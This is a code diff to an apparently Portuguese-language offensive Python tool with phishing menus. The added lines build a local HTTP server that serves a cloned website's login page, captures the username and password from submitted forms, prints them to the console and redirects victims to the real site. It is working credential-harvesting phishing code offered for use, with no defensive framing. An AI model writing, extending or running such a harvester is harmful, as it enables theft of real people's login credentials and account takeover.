@@ -233,6 +233,7 @@ def phishing_menu(language):
 
 
 # Função para as páginas de logins falsas
+# Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
     if language == '1':
@@ -277,7 +278,7 @@ def clone_website(url, server_choice, language):
 
             # Continuar com a execução no servidor selecionado (apenas localhost implementado)
             if server_choice == '1':
-                run_local_server(language)
+                run_local_server(url, language)
 
         else:
             print(f"Failed to clone {url}. Status code: {response.status_code}")
@@ -286,7 +287,7 @@ def clone_website(url, server_choice, language):
         print(f"Error cloning website: {e}")
 
 # Função para executar o servidor local para phishing
-def run_local_server(language):
+def run_local_server(target_url, language):
     clear_console()
     if language == '1':
         print("Running phishing site on localhost...")
@@ -294,9 +295,52 @@ def run_local_server(language):
         print("Executando site de phishing em localhost...")
 
     # Configurar o servidor HTTP local para servir os arquivos clonados
-    class PhishingServer(http.server.SimpleHTTPRequestHandler):
+    class PhishingServer(http.server.BaseHTTPRequestHandler):
         def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+            super().__init__(*args, **kwargs)
+
+        def do_GET(self):
+            # Servir arquivos index.html e styles.css
+            try:
+                if self.path == '/':
+                    self.path = '/index.html'
+                elif self.path == '/styles.css':
+                    pass  # Lógica para servir o arquivo CSS
+
+                # Abrir e enviar o arquivo solicitado
+                with open(os.path.join('.', self.path[1:]), 'rb') as file:
+                    self.send_response(200)
+                    if self.path.endswith('.html'):
+                        self.send_header('Content-type', 'text/html')
+                    elif self.path.endswith('.css'):
+                        self.send_header('Content-type', 'text/css')
+                    self.end_headers()
+                    self.wfile.write(file.read())
+
+            except FileNotFoundError:
+                self.send_error(404, 'File Not Found: %s' % self.path)
+
+        def do_POST(self):
+            # Capturar dados do formulário POST
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            username = post_data.split('&')[0].split('=')[1]
+            password = post_data.split('&')[1].split('=')[1]
+
+            # Exibir credenciais no console
+            if language == '1':
+                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
+                print(f"Username: {username}")
+                print(f"Password: {password}")
+            else:
+                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
+                print(f"Nome de Usuário: {username}")
+                print(f"Senha: {password}")
+
+            # Redirecionar para a URL digitada após capturar as credenciais
+            self.send_response(302)
+            self.send_header('Location', target_url)
+            self.end_headers()
 
     try:
         # Iniciar o servidor em uma thread separada
@@ -329,20 +373,6 @@ def clean_up_files():
         os.remove('styles.css')
     except Exception as e:
         print(f"Error cleaning up files: {e}")
-
-# Função para phishing
-def phishing(language):
-    clear_console()
-    if language == '1':
-        print("Phishing...")
-        url = input("Enter the URL to clone: ")
-        server_choice = input("Choose the server to use (1: localhost, 2: ngrok, 3: cloudflare): ")
-    else:
-        print("Phishing...")
-        url = input("Digite o URL para clonar: ")
-        server_choice = input("Escolha o servidor a ser usado (1: localhost, 2: ngrok, 3: cloudflare): ")
-
-    clone_website(url, server_choice, language)
 
 # Função para informações de número de telefone
 def phone_number_info(language):
